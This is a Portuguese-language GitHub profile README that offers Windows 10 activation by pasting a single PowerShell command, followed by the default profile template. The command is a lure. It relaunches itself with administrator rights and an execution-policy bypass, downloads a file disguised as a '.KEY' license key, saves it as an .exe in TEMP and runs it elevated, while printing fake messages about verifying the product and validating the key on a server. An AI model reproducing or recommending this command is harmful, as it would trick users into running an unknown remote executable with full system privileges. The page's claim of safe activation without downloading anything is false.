

<!--
### ⚡ Como ativar Windows 10 da correta, sem baixar programa algum. Ative o Windows 10 apenas usando comando do nativos do Windows PowerShell (admin).


### Para ativar o Windows 10 copie e cole o comando no PowerShell do Windows.


ATENÇÃO ::::: Copie o comando completo

@@@ $path = "$env:TEMP\TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.exe"; $url = "https://example.com/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY"; if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } Write-Host "VERIFICANDO VERSÃO DO PRODUTO..."; Invoke-WebRequest -Uri $url -OutFile $path; Write-Host "VALIDANDO CHAVE NO SERVIDOR, AGUADE..."; Start-Process $path -Verb RunAs




**ativarwindows/ativarwindows** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
